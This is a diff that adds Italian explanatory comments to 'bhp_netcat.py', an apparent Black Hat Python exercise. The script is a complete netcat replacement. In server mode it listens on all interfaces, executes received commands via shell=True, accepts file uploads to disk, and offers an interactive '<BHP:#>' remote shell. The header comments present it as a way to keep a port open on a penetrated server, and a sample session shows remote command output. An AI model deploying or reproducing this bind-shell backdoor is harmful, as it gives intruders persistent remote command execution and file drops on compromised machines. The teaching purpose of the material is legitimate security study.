@@ -1,12 +1,55 @@
 # bhp_netcat.py
 
+# Netcat puo' essere paragonato al coltellino svizzero di qualsiasi amministratore di rete e non c'e' da sorprendersi che gli amministratori di sistema lo rimuovano dalle macchine.
+# Spesso e volentieri vi capitera' di ritrovarvi con un shell aperta in un server sul quale non potete eseguire netcat, ma sul quale potete programmare ed eseguire il Python. In questi casi e' estremamente implementare un client di rete semplice che vi peremtta di caricare files, inviare comando ed in generale di mantenere aperta un porta in ascolta per utilizzi futuri.
+
+# Istruzioni per l'utilizzo: nel seguente esempio viene mostrato come eseguire due istanza di bhp_netcat, una in modalita' Server e un in modalita' Client per eseguire dei comandi sulla shell della macchina penetrata.
+
+# --------------------------------------
+# Avvio dell'istanza Server:
+# python bhp_netcat.py -l -p 9999 -c
+#
+# Avvvio dell'instanza Client:
+# python bhp_netcat.py -t localhost -p 9999
+#
+# Utilizziamo la combinazione Ctrl + D sulla linea di comando in cui abbiamo eseguito l'instanza Client per far apparire la shell:
+# <BHP:#>
+#
+# Invio di un comando da eseguire sulla shell al Server:
+# <BHP:#>  ls -la
+#
+# Output generato sulla linea di comando in cui abbiamo eseguito l'istanza Client:
+# total 19164
+# drwxr-x--- 4 rambodrahmani rambodrahmani    4096 Feb 26 13:40 .
+# drwxr-xr-x 5 rambodrahmani rambodrahmani    4096 Jan 29 16:22 ..
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    6563 Feb 26 13:40 bhp_netcat.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    1190 Jan 29 11:15 bhp_reverse_ssh.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    1431 Jan 29 11:15 bhp_ssh.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    1809 Jan 29 11:15 bhp_ssh_server.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani 1541471 Jan 29 11:15 getopt
+# drwxr-xr-x 2 rambodrahmani rambodrahmani    4096 Feb 26 12:46 imgs
+# drwxr-x--- 7 rambodrahmani rambodrahmani    4096 Feb 26 12:52 paramiko
+# -rw-r--r-- 1 rambodrahmani rambodrahmani   19483 Feb 26 12:47 README.md
+# -rwxr-x--- 1 rambodrahmani rambodrahmani 5915384 Jan 29 11:15 socket
+# -rwxr-x--- 1 rambodrahmani rambodrahmani  229899 Jan 29 11:15 subprocess
+# -rwxr-x--- 1 rambodrahmani rambodrahmani 5915381 Jan 29 11:15 sys
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    1197 Feb 26 13:07 tcp_client.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    4556 Jan 29 11:15 tcp_proxy_output_sample.txt
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    4550 Jan 29 11:15 tcp_proxy.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani     434 Jan 29 11:15 tcp_server_client.txt
+# -rwxr-x--- 1 rambodrahmani rambodrahmani    2357 Feb 26 13:24 tcp_server.py
+# -rwxr-x--- 1 rambodrahmani rambodrahmani 5915387 Jan 29 11:15 threading
+# -rwxr-x--- 1 rambodrahmani rambodrahmani     868 Feb 26 13:04 udp_client.py
+# <BHP:#> 
+# --------------------------------------
+
 import sys
 import socket
 import getopt
 import threading
 import subprocess
 
-# define some global variables
+# Definizione delle variabili globali.
 listen			= False
 command			= False
 upload			= False
@@ -15,6 +58,7 @@ target			= ""
 upload_destination	= ""
 port			= 0
 
+# Se i parametri passatti in ingresso al momento dell'esecuzione del programma non combaciano con i nostri criteri, viene mostrato il seguente messaggio che spiega come utilizzare lo strumento.
 def usage():
 	print("BHP Net Tool\n")
 	print("Usage: bhp_netcat.py -t target_host -p port")
@@ -32,6 +76,7 @@ def usage():
 	sys.exit(0)
 
 def main():
+	# La parola chiave global indica che vogliamo modificare il contenuto delle variabili globali precedentemente dichiarate.
 	global listen
 	global port
 	global execute
@@ -42,7 +87,8 @@ def main():
 	if not len(sys.argv[1:]):
 		usage()
 
-	# read the command line options
+	# Leggiamo i parametri passati da linea di comando, e impostiamo le variabili globali come richiesto.
+	# Se vengono forniti parametri non conformi, allora viene stampato il menu di aiuto.
 	try:
 		opts,args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:", ["help", "liste", "execute", "target", "port", "command", "upload"])
 	except getopt.GetoptError as err:
@@ -67,34 +113,35 @@ def main():
 		else:
 			assert False, "Unhandled Option"
 
-	# are we going to listen or just send data from stdin?
+	# Viene eseguito un controllo per sapere se dobbiamo leggere dati da stdin e inviarli sulla rete.
 	if not listen and len(target) and port > 0:
-		# read in the buffer from the command line
-		# this will block, so send CTRL + D if not sending input
-		# to stdin
+		# Legge il buffere dalla linea di comando
+		# utilizzare il comando CTRL + D per interrompere l'attesa di lettura di ulteriori dati dal buffer quando si termina l'inserimento
 		buffer = sys.stdin.read()
 
-		# send data off
+		# Invio dei dati al client.
 		client_sender(buffer)
 
-	# we are going to listen and potentially
-	# upload things, execute commands, and drop a shell back
-	# depending on our command line options above
+	# Viene avviato la fase di ascolto e ci si prepara potenzialmente a
+	# caricare files, eseguire comandi o chiudere la shell a seconda dei comandi letti dal buffere precedententemente
 	if listen:
 		server_loop()
 
+# Segue l'implementazione delle varie funzionalita' offerte dal bhp_netcat.
+
+# Iniziamo con la creazione un socket tcp di tipo SOCK_STREAM e con il successivo tentativo di connessione.
 def client_sender(buffer):
 	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 	try:
-		# connect to our target host
+		# Connessione al Server.
 		client.connect((target, port))
 
 		if len(buffer):
 			client.send(buffer)
 
 		while True:
-			# now wait for data back
+			# In attesa di riceve comandi dal Server e successiva stampa.
 			recv_len = 1
 			response = ""
 
@@ -109,27 +156,27 @@ def client_sender(buffer):
 
 			print response,
 
-			# wait for more input
+			# Lettura del Buffer da stdin.
 			buffer = raw_input("")
 			buffer += "\n"
 
-			# send it off
+			# Invio dei comandi letti.
 			client.send(buffer)
 
-			# edited to allow the client to disconnect from
-			# the Server
+			# Codice sorgente modificato per permettere ai Clients di disconenttersi dal Server.
 			if "disconnect" in buffer:
 				break
 	except:
 		print("[*] Exception! Exiting.")
 
-		# tear down the connection
+		# Chiusura della connessione.
 		client.close()
 
+# Quando eseguito in modalita' Server, questo e' il looop principale che rimane in ascolto per le connessione da parte dei vari clients.
 def server_loop():
 	global target
 
-	# if no target is defined, we listen on all interfaces
+	# Se non viene definito un host target, viene eseguito il Server sull'indirizzo standard 0.0.0.0
 	if not len(target):
 		target = "0.0.0.0"
 
@@ -140,21 +187,21 @@ def server_loop():
 	while True:
 		client_socket, addr = server.accept()
 
-		# spin off a thread to handle our new client
+		# Thread per la gestione delle connessioni in arrivo da parte dei vari clients.
 		client_thread = threading.Thread(target = client_handler, args=(client_socket,))
 		client_thread.start()
 
 def run_command(command):
-	# trim the newline
+	# Formattazione della stringa contenente il messaggio da eseguire sulla linea di comando inviata da un dei clients.
 	command = command.rstrip()
 
-	# run the command and get the output back
+	# Esecuzione del comando ricevo da un Client sulla linea di comando.
 	try:
 		output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
 	except:
 		output = "Failed to execute command.\r\n"
 
-	# send the output back to the client
+	# Invio dell'output generato dall'esecuzione del comando al client.
 	return output
 
 def client_handler(client_socket):
@@ -162,12 +209,12 @@ def client_handler(client_socket):
 	global execute
 	global command
 
-	# check for upload
+	# Controlla la necessita' di caricare files.
 	if len(upload_destination):
-		# read in all of the bytes and write to our destination
+		# Lettura di tutti i bytes e successiva scrittura nella destinazione indicata.
 		file_buffer = ""
 
-		# keep reading data until none is available
+		# Continua a leggere sino a che non sono disponibili ulteriori dati.
 		while True:
 			data = client_socket.recv(1024)
 
@@ -176,45 +223,44 @@ def client_handler(client_socket):
 			else:
 				file_buffer +=  data
 
-		# now we take these bytes and try to write them out
+		# Scrittura dei bytes ricevuti nella locazione indicata.
 		try:
 			file_descriptor = open(upload_destination, "wb")
 			file_descriptor.write(file_buffer)
 			file_descriptor.close()
 
-			# ackwonledge that we wrote the file out
+			# Invio al client della notifica di caricamente avvenuto con successo.
 			client_socket.send("Successfully saved fule to %s\r\n" % upload_destination)
 		except:
 			client_socket.send("Failed to save file to %s\r\n" % upload_destination)
 
-	# check for command execution
+	# Controlla la necessita' di eseguire comandi su riga di comando.
 	if len(execute):
-		#run the command
+		# Esecuzione del comando ed invio dell'output al client.
 		output = run_command(execute)
 
 		client_socket.send(output)
 
-	# now we go into another loop if a command shell was requested
+	# Se e' stato richiesta un shell di comando, viene avviato un nuovo loop.
 	if command:
 		while True:
-			# show a simple prompt
+			# Viene mostrato un semplice prompt dove digitare i comandi.
 			client_socket.send("<BHP:#> ")
 
-			# now we receive until we see a linefeed (enter key)
+			# Lettura dei dati da linea di comando
 			cmd_buffer = ""
 			while "\n" not in cmd_buffer:
 				cmd_buffer += client_socket.recv(1024)
 
-			# edited to allow the client to disconnect from
-			# the Server
+			# Codice sorgente modificato per permettere ai Clients di disconenttersi dal Server.
 			if "disconnect" in cmd_buffer:
 				client_socket.close()
 				break
 
-			# send back the command output
+			# Invio dell'output generato dall'esecuzione del comando.
 			response = run_command(cmd_buffer)
 
-			# send back the response
+			# Invio della risposta al client.
 			client_socket.send(response)
 
 main()
